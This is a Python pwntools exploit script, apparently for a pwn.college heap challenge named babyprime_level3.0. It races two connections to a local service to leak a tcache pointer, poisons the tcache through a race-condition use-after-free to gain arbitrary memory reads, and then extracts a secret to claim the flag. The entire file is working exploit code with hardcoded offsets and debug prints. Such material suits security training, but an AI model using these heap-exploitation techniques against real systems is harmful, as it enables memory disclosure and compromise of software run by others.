import time 
from pwn import *
import os

def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set: # checking if there's a leak like b'MESSAGE: \x00@^J\x07\x00\x00\x00' starting from '\x00'
#		print(output[-1:])
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
		# output[:1] is just the very last byte

			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0
idx = 2
def arbitrary_read(r1, r2, addr, heap_base_addr):
	global idx
	r1.clean()
	r2.clean()
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	r1.sendline(f"malloc {idx}".encode()) # chunk A
	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
	r1.sendline(f"free {idx + 1}".encode()) # free B
	
	while True:
		print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free {idx}".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
		r1.sendline(f"printf {idx}".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #
		print(stored)
	#	print(addr_packed.split(b'\x00')[0])
		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			print("hi I am here!")
			print(stored)
			break
	
	print("yo 1")
	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
	print("yo 2")
	r1.clean()
	print("yo 3")
	r1.sendline(f"printf {idx + 1}".encode())
	print("yo 4")
	r1.readuntil(b"MESSAGE: ")
	print("yo 5")
	print("About to read...")
	output = r1.readline()[:-1]
	
	print(f"Raw received: {repr(output)}")
	print("Address Read From: ", hex(u64(addr_packed)))
	print(f"Hex: {output.hex()}")
	print("yo 6")
	leak = u64(output.ljust(8, b'\x00')) 
	print("The leak is: ", hex(leak))
	idx += 2
	return leak
	
	
	
	

p = process('/challenge/babyprime_level3.0')
r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)
leak = leak_tcache(r1, r2)


offset1 = 0x8a0 # from heap base 0x8a0 0xf20 0xd40	
offset2 = 0x7ff640 # from second leak to base
offset3 = 0x7fe8c0 # from base to last leak
offset4 = 0x41d3c0 # from second leak to final 0x41a3c0 0xe1a3c0 0x416800 0xe16800 0x41d3c0 0xe1d3c0 0x2913c0 0xc8d800 (pwncollege)
offset45 = 0x4b450 # 0x4b430 0x4b450 0x4b500
offset5 = 0x1040 # 0x171740 0x1040

if leak:
	print("tcache next pointer: ", hex(leak))
	#print(f"\nGDB: gdb -p {p.pid}")
	
	
		
	print(hex((leak << 12) + offset1))
	#pause()
	
	
	leak2 = arbitrary_read(r1, r2, (leak << 12) + offset1, leak)
	print("second leak: ", hex(leak2))

	# Close and reopen connections to get fresh heap state
	#r1.close()
	#r2.close()
	#r1 = remote("localhost", 1337)
	#r2 = remote("localhost", 1337)
	
	secret_location = leak2 + offset45
	print("Secret location1: ", hex(secret_location))
	print(f"\nGDB: gdb -p {p.pid}")
	pause()
	
	leak3 = arbitrary_read(r1, r2, secret_location, leak + 1)

	secret_location = leak3 - offset5
	print("Secret location2: ", hex(secret_location))
	print(f"\nGDB: gdb -p {p.pid}")
	pause()


	secret = arbitrary_read(r1, r2, secret_location, leak + 1)
	secret = secret.to_bytes(8, 'little')
	print(f"Secret string: {secret}")

	r1.clean()
	r1.sendline(b"send_flag")
	r1.recvuntil(b"Secret: ")
	r1.sendline(secret)
	response = r1.recvall(timeout=2)
	print(f"Server response: {response}")	
else:
	#pause()
	print("Failed to leak")



p.kill()
